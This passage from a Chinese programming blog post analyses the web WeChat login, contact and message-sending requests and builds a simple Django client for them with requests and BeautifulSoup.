&lt;p&gt;这里返回了一段字符串，code为201，后面那一段字符串是头像的地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417223653352-355965195.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; c、我们在来看下html中的img标签的src的地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417223905479-796059433.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 结论：返回201，则证明用户已经扫码成功&lt;/p&gt;

&lt;h4&gt;4、web微信登陆分析&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417224458462-1880514468.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;a、首先url还是之前的url，这里就不做分析&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
https://login.wx2.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=true&amp;amp;uuid=YacjFJrAfA==&amp;amp;tip=0&amp;amp;r=-733737113&amp;amp;_=1555511755717
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;b、看下这次请求的返回值&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417224603215-179137209.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里有一个跳转的url，也就是当我们点击登陆后，会跳转到这个url&lt;/p&gt;
&lt;p&gt;这里还有一个返回码是200&lt;/p&gt;

&lt;p&gt;结论：状态码返回200，则证明登陆成功&lt;/p&gt;

&lt;h4&gt;5、分析web微信的跳转url&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417224754164-632645538.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;a、分析一下这次请求的返回值&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
&amp;lt;error&amp;gt;&amp;lt;ret&amp;gt;0&amp;lt;/ret&amp;gt;&amp;lt;message&amp;gt;&amp;lt;/message&amp;gt;&amp;lt;skey&amp;gt;@crypt_90b16895_59f7cbfc1c217310b90558af662ea9c7&amp;lt;/skey&amp;gt;&amp;lt;wxsid&amp;gt;VP1xxDiAiU5Xz8gN&amp;lt;/wxsid&amp;gt;&amp;lt;wxuin&amp;gt;1632086000&amp;lt;/wxuin&amp;gt;&amp;lt;pass_ticket&amp;gt;w%2BIW73Y3XXFLqfA%2BBworrfgKu5aRlyXW%2F57wtMPYwrP%2BWnDW3ieWQ8jBmUUTbawy&amp;lt;/pass_ticket&amp;gt;&amp;lt;isgrayscale&amp;gt;1&amp;lt;/isgrayscale&amp;gt;&amp;lt;/error&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这个返回值非常重要，我们后面登陆后需要做的操作都需要这里的信息。所以这个信息我们也要组合一下放在session后，方便的后面的请求使用&lt;/p&gt;

&lt;h4&gt;6、web微信显示最近联系人流程分析&lt;/h4&gt;
&lt;p&gt;访问为跳转url后，拿到返回值信息，web微信又会发送一个post请求，获取最近联系人信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417225146204-142644495.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; a、先看下url，这里url就需要用到上面跳转url的返回值的信息来拼接&lt;/p&gt;

&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxinit?r=-733594626&amp;amp;pass_ticket=w%2BIW73Y3XXFLqfA%2BBworrfgKu5aRlyXW%2F57wtMPYwrP%2BWnDW3ieWQ8jBmUUTbawy
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; b、这个请求的返回值就是最近联系人&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417225444796-260479240.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; c、我们就可以把这些数据渲染到html页面就可以了&lt;/p&gt;

&lt;h4&gt;7、web微信显示全部联系人&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417230604042-992228631.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 点击这里，就会显示全部联系人&lt;/p&gt;
&lt;p&gt;a、分析一下url&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxgetcontact?pass_ticket=w%2BIW73Y3XXFLqfA%2BBworrfgKu5aRlyXW%2F57wtMPYwrP%2BWnDW3ieWQ8jBmUUTbawy&amp;amp;r=1555511910553&amp;amp;seq=0&amp;amp;skey=@crypt_90b16895_59f7cbfc1c217310b90558af662ea9c7
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;我们完全可以根据session中的数据拼接这个字符串&lt;/p&gt;
&lt;p&gt;b、这次请求的返回信息就是所有的联系人&lt;/p&gt;

&lt;h4&gt;8、web发送消息&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417230918928-1630763442.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 发送消息是一个post的请求&lt;/p&gt;
&lt;p&gt; a、先来分析url&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxsendmsg?pass_ticket=w%2BIW73Y3XXFLqfA%2BBworrfgKu5aRlyXW%2F57wtMPYwrP%2BWnDW3ieWQ8jBmUUTbawy
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;我们可以通过session中的数据拼接出这个url&lt;/p&gt;

&lt;p&gt;b、在来看下这次post携带的请求体，我们完全可以通过session中的数据拼接出这个请求体&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417231112748-2030711246.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; c、分析msg这个信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417231200900-113109045.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;第一条是时间戳&lt;/p&gt;
&lt;p&gt;第二条是发送的内容&lt;/p&gt;
&lt;p&gt;第三条发送者的微信id&lt;/p&gt;
&lt;p&gt;第四条也是时间戳&lt;/p&gt;
&lt;p&gt;第五条是接受者的微信id&lt;/p&gt;

&lt;h3&gt;二、我们的代码实现&lt;/h3&gt;
&lt;p&gt;通过上面的分析，我相信大家对web微信的请求已经非常了解了，下面我们使用requests+bs4+djangon来实现一个建议的web微信&lt;/p&gt;
&lt;p&gt;1、首先看下登陆的html，重点看下我的注释&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417231616883-2003308870.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 2、进入views文件，看下返回二维码的视图函数，我们注意到，前面的html需要q_code这个变量来渲染img标签的src的路径，显示二维码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417232034774-402315417.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 3、然后后看下等待用户扫码的后台逻辑&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417232357718-1564585829.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;4、看下前端处理408返回码的逻辑&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417232521359-197521394.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 5、在来看下用户扫码后的后台逻辑&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417232709401-1323991217.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 6、在看下前端收到201的返回值处理逻辑，首先修改二维码的地址为头像的地址，然后再次发送一次请求，等待用户点击确认&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417232756746-2060683780.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 7、在看下后端处理用户点击登陆的逻辑&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417233200911-1308850874.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 8、在看下前端处理200请求的逻辑，会跳转到一个最近联系人的页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417233241731-289223827.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;9、我们在看下这个url对应的视图函数，这个视图函数是返回最近联系人的函数，需要携带规定的请求体，这些请求体已经被存储到session中&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417233351864-1740173657.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 10、在看下index.html这个页面，这个数据结构比较简单，大家自己自己抓包看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417233551377-130983679.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 11、我们再看下查所有人联系人&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417233653387-506052807.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 12、看下对应的视图函数，拼接url，然后把返回值返回给前端&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417233729759-2116570307.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 13、前端渲染数据即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417233826575-1109128562.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 14、在看发送信息的前端页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1101486/201904/1101486-20190417233910199-1242579459.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;15、再看下后端的处理逻辑，主要是拼接url和处理中文的信息&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;50&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
def sendmsg(request):
    if request.method == &quot;GET&quot;:
        return render(request,&quot;sendmsg.html&quot;)

    else:
        from_user = request.POST.get(&quot;from_user&quot;)
        to_user = request.POST.get(&quot;to_user&quot;)
        content = request.POST.get(&quot;content&quot;)

        data_dict = {
            &quot;BaseRequest&quot;:{
                &quot;DeviceID&quot;:&quot;e461335461567419&quot;,
                &quot;Sid&quot;:request.session[&quot;temp_dict&quot;].get(&quot;wxsid&quot;),
                &quot;Skey&quot;:request.session[&quot;temp_dict&quot;].get(&quot;skey&quot;),
                &quot;Uin&quot;:request.session[&quot;temp_dict&quot;].get(&quot;wxuin&quot;)
            },
            &quot;Msg&quot;:{
                &quot;ClientMsgId&quot;:int(time.time() * 1000),
                &quot;Content&quot;:content,
                &quot;FromUserName&quot;:from_user,
                &quot;LocalID&quot;:int(time.time() * 1000),
                &quot;ToUserName&quot;:to_user,
                &quot;Type&quot;:1
            },
        &quot;Scene&quot;:0
        }
        rep = requests.post(
            url= &quot;https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxsendmsg?lang=zh_CN&amp;amp;pass_ticket={p}&quot;.format(p = request.session[&quot;temp_dict&quot;][&quot;pass_ticket&quot;]),

            # 1、方式1，处理不了中文，由于json的问题
            # json=data_dict

            # 2、方式2，解决了json处理不了中文的问题，但是微信用的解码是不是常见的解码方式，所以还是处理不了中文
            # data = json.dumps(
            #     data_dict,
            #     ensure_ascii=False
            # )

            # 3、方式3，直接发送二进制文件，就可以解决发送中文的问题
            data = bytes(json.dumps(
                data_dict,
                ensure_ascii=False
            ),encoding=&quot;utf-8&quot;)
        )
        print(rep.text)

        return HttpResponse(&quot;success&quot;)
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt; 三、整体的后端代码&lt;/h3&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;70&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
from django.shortcuts import render
from django.shortcuts import HttpResponse
from django.shortcuts import redirect
import requests
import re
# Create your views here.

import time
def login(request):
    if request.method.lower() == &quot;get&quot;:
        t = int(time.time() * 1000)
        url = &quot;https://login.wx.qq.com/jslogin?appid=wx782c26e4c19acffb&amp;amp;redirect_uri=https%3A%2F%2Fwx.qq.com%2Fcgi-bin%2Fmmwebwx-bin%2Fwebwxnewloginpage&amp;amp;fun=new&amp;amp;lang=zh_CN&amp;amp;_={t}&quot;
        res = requests.get(url=url)
        # window.QRLogin.code = 200;
        # window.QRLogin.uuid = &quot;oc86pbX-hQ==&quot;;
        re_obj = re.compile('= &quot;(.*==)&quot;;$')
        q_code = re_obj.findall(res.text)[0]
        request.session[&quot;q_code&quot;] = q_code
        return render(request,&quot;login.html&quot;,locals())

import json
import re
from bs4 import BeautifulSoup
# BeautifulSoup还可以处理xml文档
def checklogin(request):
    if request.method.lower() == &quot;get&quot;:
        res_dict = {&quot;code&quot;:408,&quot;img&quot;:None,&quot;url&quot;:None}
        code = request.session[&quot;q_code&quot;]
        t = int(time.time() * 1000)
        url = &quot;https://login.wx.qq.com/cgi-bin/mmwebwx-bin/login?loginicon=true&amp;amp;uuid={code}&amp;amp;tip=0&amp;amp;r=-131537270&amp;amp;_={t}&quot;.format(code = code,t = t)
        rep = requests.get(url=url)
        if &quot;window.code=408;&quot; in rep.text:
            return HttpResponse(json.dumps(res_dict))

        elif &quot;window.code=201;&quot; in rep.text:
            # 扫码成功
            obj = re.compile(&quot;window.userAvatar = '(.*)';&quot;)
            src = obj.findall(rep.text)[0]
            res_dict[&quot;code&quot;] = 201
            res_dict[&quot;img&quot;] = src

            return HttpResponse(json.dumps(res_dict))
        elif &quot;window.code=200;&quot; in rep.text:
            # 确定登陆
            obj = re.compile('window.redirect_uri=&quot;(.*)&quot;;')
            url = obj.findall(rep.text)[0]
            res_dict[&quot;code&quot;] = 200
            res_dict[&quot;url&quot;] = url
            new = requests.get(url = url + &quot;&amp;amp;fun=new&amp;amp;version=v2&amp;amp;lang=zh_CN&quot;)
            script_obj = BeautifulSoup(new.text,&quot;html.parser&quot;)
            temp_dict = {}
            for tag in script_obj.find(name=&quot;error&quot;):
                temp_dict[tag.name] = tag.text

            request.session[&quot;temp_dict&quot;] = temp_dict
            request.session[&quot;cookies&quot;] = new.cookies.get_dict()
            return HttpResponse(json.dumps(res_dict))
        else:
            pass
            return HttpResponse(&quot;haha&quot;)


def index(request):
    url = &quot;https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxinit?r=-221192329&amp;amp;pass_ticket={t}&quot;.format(t = request.session[&quot;temp_dict&quot;].get(&quot;pass_ticket&quot;))
    init = requests.post(
        url=url,
        json={
            &quot;BaseRequest&quot;:{
                &quot;DeviceID&quot;:&quot;e701447882725714&quot;,
                &quot;Sid&quot;:request.session[&quot;temp_dict&quot;].get(&quot;wxsid&quot;),
                &quot;Skey&quot;:request.session[&quot;temp_dict&quot;].get(&quot;skey&quot;),
                &quot;Uin&quot;:request.session[&quot;temp_dict&quot;].get(&quot;wxuin&quot;)
            }
        }
    )
    init.encoding = &quot;utf-8&quot;
    init_user_dict = init.json()
    return render(request,&quot;index.html&quot;,locals())


def contact(request):
    t = int(time.time() * 1000)
    rep = requests.get(
        url = &quot;https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxgetcontact?lang=zh_CN&amp;amp;pass_ticket={p}&amp;amp;r={t}&amp;amp;seq=0&amp;amp;skey={s}&quot;.format(t = t,
                                                                                                                              p = request.session[&quot;temp_dict&quot;][&quot;pass_ticket&quot;],
                                                                                                                              s = request.session[&quot;temp_dict&quot;][&quot;skey&quot;]),
        cookies = request.session[&quot;cookies&quot;]
    )
    rep.encoding = &quot;utf-8&quot;
    user_list= rep.json()

    return render(request,&quot;contact.html&quot;,locals())


def avator(request):
    # print(request.GET.get(&quot;prev&quot;))
    # print(request.GET.get(&quot;username&quot;))
    # print(request.GET.get(&quot;skey&quot;))
    url = &quot;https://wx2.qq.com{p}&amp;amp;username={u}&amp;amp;skey={s}&quot;.format(p = request.GET.get(&quot;prev&quot;),
                                                                   u = request.GET.get(&quot;username&quot;),
                                                                   s = request.GET.get(&quot;skey&quot;)
                                                                   )
    img = requests.get(
        url = url,
        cookies = request.session[&quot;cookies&quot;]
    )
    print(url)
    return img.content


def sendmsg(request):
    if request.method == &quot;GET&quot;:
        return render(request,&quot;sendmsg.html&quot;)

    else:
        from_user = request.POST.get(&quot;from_user&quot;)
        to_user = request.POST.get(&quot;to_user&quot;)
        content = request.POST.get(&quot;content&quot;)

        data_dict = {
            &quot;BaseRequest&quot;:{
                &quot;DeviceID&quot;:&quot;e461335461567419&quot;,
                &quot;Sid&quot;:request.session[&quot;temp_dict&quot;].get(&quot;wxsid&quot;),
                &quot;Skey&quot;:request.session[&quot;temp_dict&quot;].get(&quot;skey&quot;),
                &quot;Uin&quot;:request.session[&quot;temp_dict&quot;].get(&quot;wxuin&quot;)
            },
            &quot;Msg&quot;:{
                &quot;ClientMsgId&quot;:int(time.time() * 1000),
                &quot;Content&quot;:content,
                &quot;FromUserName&quot;:from_user,
                &quot;LocalID&quot;:int(time.time() * 1000),
                &quot;ToUserName&quot;:to_user,
                &quot;Type&quot;:1
            },
        &quot;Scene&quot;:0
        }
        rep = requests.post(
            url= &quot;https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxsendmsg?lang=zh_CN&amp;amp;pass_ticket={p}&quot;.format(p = request.session[&quot;temp_dict&quot;][&quot;pass_ticket&quot;]),

            # 1、方式1，处理不了中文，由于json的问题
            # json=data_dict

            # 2、方式2，解决了json处理不了中文的问题，但是微信用的解码是不是常见的解码方式，所以还是处理不了中文
            # data = json.dumps(
            #     data_dict,
            #     ensure_ascii=False
            # )

            # 3、方式3，直接发送二进制文件，就可以解决发送中文的问题
            data = bytes(json.dumps(
                data_dict,
                ensure_ascii=False
            ),encoding=&quot;utf-8&quot;)
        )
        print(rep.text)

        return HttpResponse(&quot;success&quot;)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 相信如果大家看懂我前面分析web微信的逻辑，看懂应该不成问题。如果有不清楚的，请评论留言，感谢大家关注，谢谢！&lt;/p&gt;

</description>
<pubDate>Wed, 17 Apr 2019 15:43:00 +0000</pubDate>
<dc:creator>bainianminguo</dc:creator>
<og:description>前言： 今天我们利用requests模块+django+bs4浏览器来实现一个web微信的基本功能，主要实现的功能如下 a、实现返回二维码 b、实现手机扫码后二维码变成变成头像 c、实现手机点击登陆成</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/bainianminguo/p/10727084.html</dc:identifier>
</item>
</channel>
</rss>